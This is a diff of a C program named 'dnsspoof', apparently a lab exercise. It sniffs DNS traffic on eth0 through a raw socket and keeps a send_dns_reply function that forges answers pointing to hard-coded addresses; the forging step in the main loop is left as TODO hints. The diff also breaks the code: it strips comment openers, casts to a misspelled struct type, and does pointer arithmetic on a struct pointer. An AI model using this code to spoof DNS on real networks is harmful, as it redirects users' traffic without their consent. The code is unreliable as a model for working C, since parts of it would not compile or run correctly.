@@ -4,127 +4,289 @@
 
 
 
-/********************************************************/
+********************************************************/
 
 
-//socklib
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
-#include <errno.h>
-#include  <netdb.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>		
-#include <sys/types.h>
-#include <arpa/inet.h>		
-#include <sys/stat.h>
-#include <unistd.h>
-#include <linux/ip.h>
-#include <netinet/udp.h>
-#include <inttypes.h>
-#include "dns.h"
-#include "colordefs.h"
+#include "node.h"
 
-int main(int agrc, char *argv[]) {
+int main(int argc, char *argv[]) {
 
-	int sock = 0, csock = 0, packet_size = 0;
-	struct sockaddr_in clientaddr;
-	struct dns_header *header = NULL;
-	struct dns_question_section *query_info = NULL;
-	char *dns_packet = NULL;
-	char *question_domain = NULL;
-	char *message = NULL;
-	char *fqdn = NULL;
-	char *server_ip = NULL;
-
-	memset((void *) &clientaddr,0,sizeof(struct sockaddr_in));
-
-
-	if((sock = create_socket("mani",2222,SOCK_RAW)) == -1){
-		printf("Failed to create UDP socket for DNS server\n");
-		//if(server_ip) free(server_ip);
+	//check correct usage 
+	if(argc < ARGNUM){
+		printf("usage: dnsspoof redirectDomain requestedDomain\n");
 		return EXIT_FAILURE;
 	}
-	//if(server_ip) free(server_ip);
-	int count = 0;
-	/* DNS server receive loop */
+
+	//setup raw socket
+	int rawsock = 0, packet_size = 0, on = 1;
+
+	if((rawsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) ) < 0){
+		perror("socket()");
+		return EXIT_FAILURE;
+	}
+
+ 	if(setsockopt(rawsock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(int)) < 0){
+	 	printf("setsockopt failed\n");
+	  return EXIT_FAILURE;
+	}
+
+	if(setsockopt(rawsock,SOL_SOCKET,SO_BINDTODEVICE,"eth0",strlen("eth0")+ 1) < 0){
+		printf("BINDTODEVICE failed\n");
+		return EXIT_FAILURE;
+	}
+
+	printf("socket setup successful\n");
+	//for debug inet_ntop 
+	char src[INET_ADDRSTRLEN];
+	char dest[INET_ADDRSTRLEN];
+
+	//for receiving
+	int rx_bytes;
+	char buffer[UDP_RECV_SIZE + 1];
+	char *domain_name = NULL;
+	struct sockaddr_in clientaddr;
+	int addrlen = sizeof(struct sockaddr_in);
+
+	//receive-inspect-act loop
 	while(1){
 
-		//if (count++ > 15) exit(0);
-		//Free memory, if allocated */
-		//if(dns_packet != NULL) free(dns_packet);
-		dns_packet = NULL;
-
-		/* Read in DNS requests */
-		if((dns_packet = receive(sock,SOCK_RAW,&packet_size,csock,&clientaddr)) == NULL){
-			printf("Failed to receive DNS request from client\n");
+		//receive with errcheck on recvfrom()
+		if( (rx_bytes = recvfrom(rawsock, buffer, UDP_RECV_SIZE, 0,
+					(struct sockaddr *) &clientaddr, (socklen_t *) &addrlen)) < 0 ){
+			printf("recvfrom() failed\n");
 			return EXIT_FAILURE;
 		}
 
-		printf("Packet size is %d\n",  packet_size);
-		/* Process DNS request packets */
-		if(packet_size <= (int) (sizeof(struct dns_header) + sizeof(struct dns_question_section))){
-			printf("Received invalid DNS packet; packet size too small");
-			continue;
-		}
-		if (packet_size <= (int) (sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header)+ sizeof(struct dns_question_section))) {
-			continue;
-		}
-		//used for IP/UDP header for respond
-		char *dns_packet_cpy = dns_packet;
 
-		dns_packet += sizeof(struct iphdr);
-		dns_packet += sizeof(struct udphdr);
+		//packet inspection time!
+		struct iphdr *ippart = (struct iphdr *) (buffer+ETH_HS);
+		struct udphdr *udppart = (struct udppart *) (buffer+ETH_HS+IP_HS);
+		struct dnshdr *dnspart = (struct dnshdr *) (buffer+ETH_HS+IP_HS+UDP_HS);
+		inet_ntop(AF_INET, ((struct in_addr *)&(ippart->saddr)), src, INET_ADDRSTRLEN);
+		inet_ntop(AF_INET, ((struct in_addr *)&(ippart->daddr)), dest, INET_ADDRSTRLEN);
+		//is this a localhost to localhost packet?
+		if(ippart->saddr==V4_LOCHOST || ippart->daddr==V4_LOCHOST) continue;
+		//TODO is this an outgoing packet? hints: saddr, daddr
 		
-		header = (struct dns_header *) dns_packet;
+		//is this a UDP packet? 
+		if(ippart->protocol != UDP) continue;
+
+		//TODO is this a DNS packet? hints: dest port has to be 53
+		if(ntohs(udppart->dest) != DNS_PORT && ntohs(udppart->source) != DNS_PORT) continue;
+
+		printf("--------------------------------\n");
+		printf("Intercepted DNS packet of size %d\n",rx_bytes);
+
+		printf("\t---IPHDR:\n");
+		printf("\tsaddr %s\n", src);
+		printf("\tdaddr %s\n", dest);
+		printf("\tproto %d\n", ippart->protocol);
+		printf("\t---------\n\n");
 
 		
-		/* Only process DNS queries that have one question section */
-		if(ntohs(header->num_questions) != MAX_DNS_QUESTIONS){
-			printf("DNS packet contained the wrong number of questions %d\n",ntohs(header->num_questions));
-			continue;
-		}
+		printf("\t---UDPHDR:\n");
+		printf("\tsport %d\n", ntohs(udppart->source));
+		printf("\tdport %d\n", ntohs(udppart->dest));
+		printf("\tlen %d\n", ntohs(udppart->len));
+		printf("\tcheck %d\n", ntohs(udppart->check));
+		printf("\t----------\n\n");
 
-		printf("------------ DNS QUERY -----------------");
-    	printf("\n [%d QUS]",ntohs(header->num_questions));
-    	printf(" [%d ANW]",ntohs(header->num_answers));
-    	printf(" [%d AUT]",ntohs(header->num_authority));
-    	printf(" [%d ADD]\n\n",ntohs(header->num_additional));
+    //printf(" [%d ANW]",ntohs(dnspart->num_answers));
+    //printf(" [%d AUT]",ntohs(dnspart->num_authority));
+    //printf(" [%d ADD]\n\n",ntohs(dnspart->num_additional));
+		print_dns_packet(dnspart, rx_bytes-UDP_HS-IP_HS-ETH_HS);
+
+		//TODO is this the query we want to spoof?
+	//	domain_name = get_domain_queried(dnspart, rx_bytes);
 		
-		//here
 
-		/* Extract the domain name in a standard string format */
-		question_domain = get_domain_in_question(dns_packet,packet_size);
-		printf(_BBLUE_"Domain Name is %s"_NORMAL_"\n", question_domain);
+		//TODO forge packet and feed it back to the raw socket
 
-		/* Make sure we got a valid domain query string */
-		if(question_domain != NULL && strlen(question_domain) > 0){
-
-			
-			/* Check to make sure this is a type A or type NS, class IN DNS query */
-			query_info = (struct dns_question_section *) ((dns_packet) + sizeof(struct dns_header) + strlen(question_domain) + 1);
-			if((query_info->class == htons(DNS_CLASS_IN)) && ((query_info->type == htons(DNS_TYPE_A)) || (query_info->type == htons(DNS_TYPE_NS)))){
-
-					printf(_YELLOW_"DNS CLASS IN , TYPE A | NS"_NORMAL_"\n");
-					/* Send DNS reply packet to client */
-					if(!send_dns_reply(question_domain,sock,&clientaddr,query_info->type,dns_packet,packet_size,dns_packet_cpy)){
-						printf("Failed to send DNS response packet\n");
-					}
-
-			} else {
-				printf(_BRED_"Received unsupported DNS query type or class. Only type A, NS and class IN queries are supported."_NORMAL_"\n");
-			}	
-		}
+		//clean up for next packet
+		memset(buffer, 0, UDP_RECV_SIZE+1);
+		free(domain_name);
 	}
+
 	return 0;
 }
+
+
+void print_dns_packet(char *packet, int packet_size){
+	printf("\t---DNSHDR:\n");
+	struct dnshdr *dnsheader= packet;
+	int numq=ntohs(dnsheader->num_questions), numans=ntohs(dnsheader->num_answers),
+		numauth=ntohs(dnsheader->num_authority), numadd=ntohs(dnsheader->num_additional);
+
+	//one question only
+	//if(numq > 1) return;
+
+  printf("\t[%d QUS]\n",numq);
+	char *dname = NULL, *dname_pointer = packet+DNS_HS, *tmp_ptr = NULL;
+	int part_len, dname_len = 0;
+
+	do{
+		part_len = (int) dname_pointer[0];
+
+		if((part_len <= 0) || (part_len > (packet_size-DNS_HS))){
+			break;
+		}
+
+		dname_pointer++;
+
+		tmp_ptr = dname;
+		dname = realloc(dname, (dname_len+part_len+PERIOD_SIZE+1));
+		if(dname == NULL){
+			if(tmp_ptr) free(tmp_ptr);
+			perror("realloc()");
+			return;
+		}
+		memset(dname+dname_len,0,part_len+PERIOD_SIZE+1);
+
+		strncat(dname, dname_pointer, part_len);
+		strncat(dname, PERIOD, PERIOD_SIZE);
+
+		dname_len += part_len + PERIOD_SIZE + 1;
+		dname_pointer += part_len;
+	} while(part_len > 0);
+
+	struct dns_question_section *question =
+		(struct dns_question_section *)(dnsheader+DNS_HS+dname_len);
+	printf("\tname %s\n", dname);
+	printf("\ttype %d\n", ntohs(question->type));
+	printf("\tclass %d\n", ntohs(question->class));
+	free(dname);
+	return;
+}
+
+
+/* Extract the domain name from the DNS query packet */
+char *get_domain_queried(char *dns_packet, int packet_size)
+{
+	char *domain_name_pointer = NULL;
+	char *domain_name = NULL;
+	char *tmp_ptr = NULL;
+	int dns_header_len = DNS_HS;
+	int name_part_len = 0;
+	int dn_len = 0;
+
+	if(packet_size > dns_header_len){
+
+		//where domain name starts
+		domain_name_pointer = (dns_packet + dns_header_len);
+	
+		//start processing, "word" by "word"
+		do {
+			//length of this part of the name
+			name_part_len = (int) domain_name_pointer[0];
+
+			/* If the length is zero or invalid, then stop processing the domain name */
+			if((name_part_len <= 0) || (name_part_len > (packet_size-dns_header_len))){
+				printf("Ignoring : invalid name_part_len \n");
+				break;
+			}
+			
+			//length confirmed--move to where the string starts
+			domain_name_pointer++;
+
+			/* Reallocate domain_name pointer to name_part_len plus two bytes;
+			 * one byte for the period, and one more for the trailing NULL byte.
+			 */
+			tmp_ptr = domain_name;
+			domain_name = realloc(domain_name,(dn_len+name_part_len+PERIOD_SIZE+1));
+			if(domain_name == NULL){
+				if(tmp_ptr) free(tmp_ptr);
+				perror("Realloc Failure");
+				return NULL;
+			}
+			memset(domain_name+dn_len,0,name_part_len+PERIOD_SIZE+1);
+			
+			//printf("Domain name successfully reallocated\n");
+
+			/* Concatenate this part of the domain name, plus the period */
+			strncat(domain_name,domain_name_pointer,name_part_len);
+			strncat(domain_name,PERIOD,PERIOD_SIZE);
+
+			/* Keep track of how big domain_name is, and point 
+			 * domain_name_pointer to the next part of the domain name.
+			 */
+			dn_len += name_part_len + PERIOD_SIZE + 1;
+			domain_name_pointer += name_part_len;
+		} while(name_part_len > 0);
+	}
+
+	return domain_name;
+}
+
+/* Create a server socket */
+int create_socket()
+{
+	int on = 1;
+	int sock = 0;
+
+  if((sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) < 0){
+  	printf("Socklib: Failed to create socket\n");
+    return -1;
+ 	}
+
+	//set reusable 
+ 	if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(int)) < 0){
+	 	printf("Socklib: Failed to set socket option SO_REUSEADDR\n");
+	  return -1;
+	}
+
+	return sock;
+}
+
+
+
+// Listen for and receive data from a client connection.
+// CONTAINS MALLOC
+char *receive(int lsock, int *rx_bytes, struct sockaddr_in *clientaddr)
+{
+	int recv_size = 0;
+	int clen = 0, header_offset = 0;
+	int addrlen = sizeof(struct sockaddr_in);
+	char *buffer = NULL, *tmp_ptr = NULL, *data_ptr = NULL;
+	char *clen_ptr = NULL, *line_end_ptr = NULL;
+
+	*rx_bytes = 0;
+
+	/* Malloc space for the buffer */
+	if((buffer = malloc(UDP_RECV_SIZE+1)) == NULL){
+  	perror("malloc() failed");
+    return NULL;
+  }
+
+  memset(buffer,0,UDP_RECV_SIZE+1);
+
+	if((*rx_bytes = recvfrom(lsock,buffer,UDP_RECV_SIZE,0,(struct sockaddr *) clientaddr, (socklen_t *) &addrlen)) < 0){
+		printf("recvfrom() failed\n");
+		if(buffer) free(buffer);
+		return NULL;
+	}
+		
+	/* Return received data */
+	return buffer;
+}
+
+
+
+
+
+//--------------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+
 
 /* Create DNS reply packet and send it to the client */
 int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientaddr, int dns_type, char *request_packet, int request_packet_size, char *cpy)
 {
 	char *reply_packet = NULL, *fqdn = NULL;
-	struct dns_header *header = NULL;
+	struct dnshdr *header = NULL;
 	struct dns_answer_section answer;
 	int reply_packet_size = 0;
 	int answer_size = sizeof(struct dns_answer_section);
@@ -142,7 +304,7 @@ int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientad
 	//BBC IP 212.58.251.195
 
 	/* Check to make sure the packet size is of a valid length */
-	if(request_packet_size > ((int) (sizeof(struct dns_header) + sizeof(struct dns_question_section)) + (int) strlen(question_domain))){
+	if(request_packet_size > ((int) (sizeof(struct dnshdr) + sizeof(struct dns_question_section)) + (int) strlen(question_domain))){
 
 		 //maskari TODO
 		 ip_address2 = inet_addr("212.58.251.195");//bbc
@@ -207,7 +369,7 @@ int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientad
 		}
 
 		/* Change the number of answers and the flags values of the DNS packet header */
-        header = (struct dns_header *) reply_packet;
+        header = (struct dnshdr*) reply_packet;
         header->num_answers = htons(DNS_NUM_ANSWERS);
         header->flags = htons(DNS_REPLY_FLAGS);
 		
@@ -309,7 +471,7 @@ int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientad
 				IN DNS PACKET : alias
 				ip_address2 = inet_addr("212.58.251.195");//bbc
 		 		ip_address1 = inet_addr("74.125.226.212");//google
-		/********************************************************************************/
+		********************************************************************************/
 		
 		
 		
@@ -320,6 +482,8 @@ int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientad
 
 	return 0;
 }
+
+
 
 int ip_sum(char* packet, int n) {
 
@@ -358,6 +522,7 @@ void print_udpheader(struct udphdr *udp, int way) {
 				ntohs(udp->len),
 				ntohs(udp->check));
 }
+
 /* Used to construct the IP header she sent us */
 uint32_t decapsulate_fromip (char *packet, struct iphdr **ipheader) {
 
@@ -394,134 +559,7 @@ uint32_t decapsulate_fromip (char *packet, struct iphdr **ipheader) {
 	return i->daddr;
 }
 
-/* Extract the domain name from the DNS query packet */
-char *get_domain_in_question(char *dns_packet, int packet_size)
-{
-	char *domain_name_pointer = NULL;
-	char *domain_name = NULL;
-	char *tmp_ptr = NULL;
-	int dns_header_len = sizeof(struct dns_header);
-	int name_part_len = 0;
-	int dn_len = 0;
 
-	if(packet_size > dns_header_len){
-
-		//printf("packet size= %d\n", packet_size);
-
-		domain_name_pointer = (dns_packet + dns_header_len);
-		
-		do {
-			/* Get the length of the next part of the domain name */
-			name_part_len = (int) domain_name_pointer[0];
-
-			//printf("name_part_len=%d\n",name_part_len);
-
-			/* If the length is zero or invalid, then stop processing the domain name */
-			if((name_part_len <= 0) || (name_part_len > (packet_size-dns_header_len))){
-				printf("Ignoring : invalid name_part_len \n");
-				break;
-			}
-			domain_name_pointer++;
-
-			/* Reallocate domain_name pointer to name_part_len plus two bytes;
-			 * one byte for the period, and one more for the trailing NULL byte.
-			 */
-			tmp_ptr = domain_name;
-			domain_name = realloc(domain_name,(dn_len+name_part_len+PERIOD_SIZE+1));
-			if(domain_name == NULL){
-				if(tmp_ptr) free(tmp_ptr);
-				perror("Realloc Failure");
-				return NULL;
-			}
-			
-			//printf("Domain name successfully reallocated\n");
-
-			memset(domain_name+dn_len,0,name_part_len+PERIOD_SIZE+1);
-
-			/* Concatenate this part of the domain name, plus the period */
-			strncat(domain_name,domain_name_pointer,name_part_len);
-			strncat(domain_name,PERIOD,PERIOD_SIZE);
-
-			/* Keep track of how big domain_name is, and point 
-			 * domain_name_pointer to the next part of the domain name.
-			 */
-			dn_len += name_part_len + PERIOD_SIZE + 1;
-			domain_name_pointer += name_part_len;
-		} while(name_part_len > 0);
-	}
-
-	return domain_name;
-}
-
-/* Create a server socket */
-int create_socket(char *ip, int port, int sock_type)
-{
-	int on = 1;
-	int sock = 0;
-	int proto = 0;
-	int addrlen = sizeof(struct sockaddr_in);
-	struct sockaddr_in serveraddr;
-
-	memset((void *) &serveraddr,0,sizeof(struct sockaddr_in));
-
-	/* Use the right protocol type, if known */
-	if(sock_type == SOCK_STREAM){
-		proto = IPPROTO_TCP;
-	} else if(sock_type == SOCK_DGRAM){
-		proto = IPPROTO_UDP;
-	} else if(sock_type == SOCK_RAW) {
-		proto = IPPROTO_UDP;
-	}
-	//int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    if((sock = socket(AF_INET,sock_type,proto)) < 0){
-            printf("Socklib: Failed to create socket\n");
-            return -1;
-    }
-
-     /* Set this to make sure we don't have problems re-binding the port if the application is
-	 * shut down and then re-started in quick succession. 
-	 */
-    if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(int)) < 0){
-        printf("Socklib: Failed to set socket option SO_REUSEADDR\n");
-		//close_socket(sock);
-        return -1;
-    }
-
-	return sock;
-}
-
-/* Listen for and receive data from a client connection. */
-char *receive(int lsock, int sock_type, int *rx_bytes, int csock, struct sockaddr_in *clientaddr)
-{
-	int recv_size = 0;
-	int clen = 0, header_offset = 0;
-	int addrlen = sizeof(struct sockaddr_in);
-	char *buffer = NULL, *tmp_ptr = NULL, *data_ptr = NULL;
-	char *clen_ptr = NULL, *line_end_ptr = NULL;
-
-	*rx_bytes = 0;
-	
-	if(sock_type == SOCK_DGRAM || sock_type == SOCK_RAW) {
-		//bytes_recvd = recvfrom(fd, buffer, 65535, 0,  &src, &srclen);
-		/* Malloc space for the buffer */
-		if((buffer = malloc(UDP_RECV_SIZE+1)) == NULL){
-                	perror("Malloc failed");
-                	return NULL;
-        	}
-        	memset(buffer,0,UDP_RECV_SIZE+1);
-
-		/* Read in UDP data. We only receive up to UDP_RECV_SIZE, which is sufficient for DNS requests. */
-		if((*rx_bytes = recvfrom(lsock,buffer,UDP_RECV_SIZE,0,(struct sockaddr *) clientaddr, (socklen_t *) &addrlen)) < 0){
-			printf("Socklib: Failed to read data from UDP socket\n");
-			if(buffer) free(buffer);
-			return NULL;
-		}
-		
-	}
-	
-	/* Return received data */
-	return buffer;
-}
 
 void print_ipheader(struct iphdr *i) {
 
